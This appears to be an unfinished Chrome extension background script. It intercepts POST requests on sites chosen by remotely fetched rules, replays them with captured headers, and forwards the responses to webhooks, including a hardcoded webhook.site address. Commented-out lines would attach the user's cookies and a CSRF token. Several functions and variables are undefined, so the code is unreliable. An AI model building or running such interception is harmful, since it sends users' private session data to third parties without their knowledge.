const registerRules2=()=>{
    if(userId){
        let rulesUri=`https://matureshock.backendless.app/api/data/rule?where=userID='rob-110'`

    fetch(rulesUri,{
        method:'GET',
        headers:{
            'Content-Type':'application/json'
        }
    })
    .then(res=>{
        return res.json()
    })
    .then(result=>{
        let target_initiators=[]
        let target_paths=[]
        let methods=[]
        let dests=[]
        result.forEach(rule=>{
            target_initiators.push(rule.target_page_url)
            target_paths.push(rule.target_request_url)
            methods.push(rule.target_request_method)
            dests.push(rule.destination_webhook_url)
        })

        if(target_initiators.length!==0 && target_paths.length!=0 && methods.length!=0 && dests.length!=0){
            const formatted=formaT(result)
            addRuleListeners2(formatted)
            
        }

        // addIntpt2(target_initiators,target_paths,methods,dests)

    })
    }
    else{
        console.log('No user id');
    }
    
}

registerRules2()

const duplicatePostRequest=(url,body,headers,method,destination)=>{
    let cookieSt=''
    let heads={}
    headers.forEach(val=>{
        heads[val.name]=val.value
    })

    // chrome.cookies.get({})
    // cookies.forEach(val=>{
    //     cookieSt+=`${val.name}=${val.value}; `
    // })

    // heads['csrf-token']='ajax:3789551747108583699'
    // heads['cookie']=cookieSt


    fetch(url,{
        method:method,
        headers:heads,
        body:JSON.stringify(body)
    })
    .then(async res=>{
        if(res.status==200){
            let resBody=await res.json()
;            sendResBody(resBody,url,destination)

        }else{
            console.log('Error duplicating post request',url);
        }

    })
}

const addRuleListeners2=(rule_arr)=>{

    if(state=='OFF'){
        if(!already){
            already=true
            console.log('Interceptor Turned off');
        }
    }else{
        
        rule_arr.forEach(rule=>{
            chrome.webRequest.onBeforeRequest.addListener((n)=>{
                if(n.initiator.includes('chrome-extension')){
                    console.log('Extension request')
                }
                else{
                    if(n.method.toUpperCase()=='POST'){


                        if(rule.methods.includes('POST')){
                            let pageRelevant=false
                        }

                        // if(rule.targeturls){
                        //     if(rule.targeturls.length==1){
                                
                        //         if(n.url.includes(rule.targeturls[0])){
                        //             if(rule.methods.includes(n.method.toUpperCase())){
                        //                 duplicatePostRequest(n.url,n.requestBody,reqHeaders,n.method,rule.destination)
                        //             }
                                    
                        //         }else{
                        //             // console.log('not valid')
                        //             // console.log(n.url)
                        //         }
                        //     }
                        //     else if(rule.targeturls.length>1){
                        //         if(n.url.includes(rule.targeturls[0]) && n.url.includes(rule.targeturls[1])){
                        //             if(rule.methods.includes(n.method.toUpperCase())){
                        //                 duplicatePostRequest(n.url,n.requestBody,reqHeaders,n.method,rule.destination)
                        //             }
                        //         }
                        //         else{
                        //             // console.log('not valid')
                        //             // console.log(n.url)
                        //         }
                        //     }
                        // }




                    }

                    
                }
    
            },{urls:[`${rule.url_first}*`]},["requestBody"])
        })
        console.log("Rule listeners added(POST)")
    }
    
}

const addIntpt2=(initiators,paths,methods,destinations)=>{
    const regex = /[^A-Za-z0-9]/g;
    parenturls=[]
    initiators.forEach(initiator=>{
        
        // initiator=initiator.replace(regex,'')
        let head=initiator.split('.')[0]
        let end=initiator.split('.')[1].replace(regex,'')
        parenturls.push(`*://*.${head}.${end}/*`)
    })

    let pathsBN=[]


    paths.forEach(path=>{
        let all=path.split('/')
        let norm=''
        all.forEach(m=>{
            n=m.replace(regex,'')
            norm+=`${n}/`
        })
        norm=norm.substring(0,norm.length-1)
        pathsBN.push(norm)
    })

    console.log(pathsBN);

    let meths=[]

    methods.forEach(arr=>{
        arr.forEach(val=>{
            meths.push(val)
        })
    })

    const destination=destinations[0]



    chrome.webRequest.onBeforeRequest.addListener((n)=>{
        if(state=='OFF'){
            if(!already){
                already=true
                console.log('Interceptor Turned off');
            }
        }
        else{
            if(n.initiator.includes('chrome-extension')){

            }else{
                if(n.method=='POST'){
                    // console.log('POST request to',n.url);
                    let whole=new URL(n.url)
                    let relevant=false
                    pathsBN.forEach(path=>{
                        if(whole.pathname.includes(path)){
                            relevant=true    
                        }
                    })
    
                    if(relevant){
                        let domain=n.initiator.split('www.')[1]
                        let body=n.requestBody
    
                        duplicatePost(n.url,body,n.method)
    
    
                        // console.log('Relevant post request',body);
        
                    }else{
                        // console.log('Not relevant', n.url);
                    }
                }
                
            }
        }
        
    },{
        urls:parenturls
    },["requestBody"])

}


const duplicatePost=(url,body,method)=>{
    fetch(url,{
        method:method,
        headers:heaa,
        body:JSON.stringify(body)
    })
    .then(async res=>{
        if(res.status==200){
            let resBody=await res.json()
            sendResBody2(resBody,url)

        }else{
            console.log('Something went Bad for',url,'\n',res);
        }


    })
}

const sendResBody2=(resBody,url)=>{

    let sendTourl='https://webhook.site/a722a152-9598-4748-b573-ef97ddb43100'

    console.log(typeof(resBody));
    
    fetch(sendTourl,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({name:'Austo'})
    })
    .then(res=>{
        if(res.status==200){
            console.log('Successfully saved response body for ',url);
        }
        else{
            console.log('Error sending response body for', url);
        }
    })
}